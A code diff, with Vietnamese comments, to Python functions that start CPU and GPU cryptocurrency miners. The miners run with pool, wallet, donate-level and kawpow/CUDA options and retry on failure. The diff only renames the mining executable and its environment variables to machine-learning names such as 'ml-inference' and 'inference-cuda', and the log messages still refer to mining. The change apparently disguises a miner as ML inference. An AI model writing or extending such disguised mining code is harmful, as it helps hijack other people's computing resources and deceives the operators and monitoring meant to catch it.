@@ -112,21 +112,21 @@ def start_mining_process(retries=3, delay=5):
         subprocess.Popen or None: Đối tượng quá trình khai thác hoặc None nếu thất bại.
     """
     # Lấy đường dẫn thực thi từ biến môi trường
-    mining_executable = os.getenv('MINING_COMMAND', '/usr/local/bin/mlinference')
+    ml_executable = os.getenv('ML_COMMAND', '/usr/local/bin/ml-inference')
 
-    # Kiểm tra giá trị biến môi trường MINING_COMMAND
-    if not mining_executable:
-        logger.error("Biến môi trường MINING_COMMAND không được thiết lập.")
+    # Kiểm tra giá trị biến môi trường ML_COMMAND
+    if not ml_executable:
+        logger.error("Biến môi trường ML_COMMAND không được thiết lập.")
         stop_event.set()
         return None
 
     # Kiểm tra xem tệp thực thi có tồn tại và có quyền thực thi không
-    if not os.path.isfile(mining_executable):
-        logger.error(f"Không tìm thấy tệp thực thi khai thác tại: {mining_executable}")
+    if not os.path.isfile(ml_executable):
+        logger.error(f"Không tìm thấy tệp thực thi khai thác tại: {ml_executable}")
         stop_event.set()
         return None
-    if not os.access(mining_executable, os.X_OK):
-        logger.error(f"Tệp thực thi khai thác không có quyền thực thi: {mining_executable}")
+    if not os.access(ml_executable, os.X_OK):
+        logger.error(f"Tệp thực thi khai thác không có quyền thực thi: {ml_executable}")
         stop_event.set()
         return None
 
@@ -145,8 +145,8 @@ def start_mining_process(retries=3, delay=5):
         return None
 
     # Định nghĩa lệnh khai thác CPU dưới dạng danh sách
-    mining_command = [
-        mining_executable,
+    ml_command = [
+        ml_executable,
         '--donate-level', '1',
         '-o', mining_server_cpu,
         '-u', mining_wallet_cpu,
@@ -160,7 +160,7 @@ def start_mining_process(retries=3, delay=5):
         logger.info(f"Thử khởi chạy quá trình khai thác CPU (Cố gắng {attempt}/{retries})...")
         try:
             mining_process = subprocess.Popen(
-                mining_command,
+                ml_command,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE
             )
@@ -208,18 +208,18 @@ def start_gpu_mining_process(retries=3, delay=5):
         subprocess.Popen or None
     """
     # Lấy đường dẫn thực thi
-    mining_executable = os.getenv('MINING_COMMAND', '/usr/local/bin/mlinference')
-    if not mining_executable:
+    cuda_executable = os.getenv('CUDA_COMMAND', '/usr/local/bin/inference-cuda')
+    if not cuda_executable:
         logger.error("Biến môi trường MINING_COMMAND không được thiết lập (GPU).")
         stop_event.set()
         return None
 
-    if not os.path.isfile(mining_executable):
-        logger.error(f"Không tìm thấy tệp thực thi khai thác GPU tại: {mining_executable}")
+    if not os.path.isfile(cuda_executable):
+        logger.error(f"Không tìm thấy tệp thực thi khai thác GPU tại: {cuda_executable}")
         stop_event.set()
         return None
-    if not os.access(mining_executable, os.X_OK):
-        logger.error(f"Tệp thực thi khai thác GPU không có quyền thực thi: {mining_executable}")
+    if not os.access(cuda_executable, os.X_OK):
+        logger.error(f"Tệp thực thi khai thác GPU không có quyền thực thi: {cuda_executable}")
         stop_event.set()
         return None
 
@@ -244,7 +244,7 @@ def start_gpu_mining_process(retries=3, delay=5):
     # Định nghĩa lệnh khai thác GPU
     # Ví dụ: --algo kawpow, --cuda, --cuda-loader=..., -o <pool>, -u <wallet>, -p x, --tls
     gpu_command = [
-        mining_executable,
+        cuda_executable,
         '--algo', 'kawpow',
         '--cuda',
         f'--cuda-loader={cuda_loader}',
